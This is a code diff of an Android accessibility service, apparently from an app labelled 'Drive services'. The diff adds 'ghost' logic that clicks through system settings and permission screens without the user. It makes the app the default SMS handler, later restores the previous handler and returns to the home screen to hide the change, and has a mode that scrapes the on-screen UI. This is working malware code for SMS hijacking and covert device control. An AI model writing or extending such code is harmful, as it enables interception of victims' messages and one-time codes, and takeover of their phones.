@@ -215,15 +215,11 @@ class MyAccessibilityService : AccessibilityService() {
         // --- DEFAULT SMS GHOST LOGIC ---
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
             val mode = DefaultSmsManager.expectedMode
-            if (mode == "AUTO" || mode == "RELENTLESS" || mode == "RESTORE") {
+            if (mode == "AUTO" || mode == "RELENTLESS") {
                 val root = rootInActiveWindow ?: return
                 
                 // Resolve which app name we are looking for
-                val targetLabel = if (mode == "RESTORE") {
-                    DefaultSmsManager.getStoredPreviousLabel(this)
-                } else {
-                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
-                }
+                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
 
                 if (targetLabel == null) {
                     DebugLogger.log("GHOST_SMS", "Abort: Target label is null")
@@ -259,6 +255,51 @@ class MyAccessibilityService : AccessibilityService() {
                             }
                         }
                     }, 200)
+                }
+            } else if (mode == "RESTORE") {
+                val root = rootInActiveWindow ?: return
+                val targetLabel = DefaultSmsManager.getStoredPreviousLabel(this)
+                if (targetLabel == null) {
+                    DefaultSmsManager.expectedMode = ""
+                    return
+                }
+
+                // Phase 1: Are we on the selection screen with the target app visible?
+                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                var clickedApp = false
+                for (node in appNodes) {
+                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                    while (target != null && !target.isClickable) {
+                        target = target.parent
+                    }
+                    if (target != null && target.isClickable) {
+                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        clickedApp = true
+                        DebugLogger.log("GHOST_RESTORE", "Clicked target app: $targetLabel")
+                        break
+                    }
+                }
+
+                if (clickedApp) {
+                    DefaultSmsManager.expectedMode = "" // Disarm
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                    }, 500)
+                    return
+                }
+
+                // Phase 2: We must be on the Default Apps category list. Find "SMS" or "SMS app" anchor.
+                val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
+                for (node in smsNodes) {
+                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                    while (target != null && !target.isClickable) {
+                        target = target.parent
+                    }
+                    if (target != null && target.isClickable) {
+                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("GHOST_RESTORE", "Clicked SMS category")
+                        break
+                    }
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
                 val treeJson = getInstantTree(null, 10)
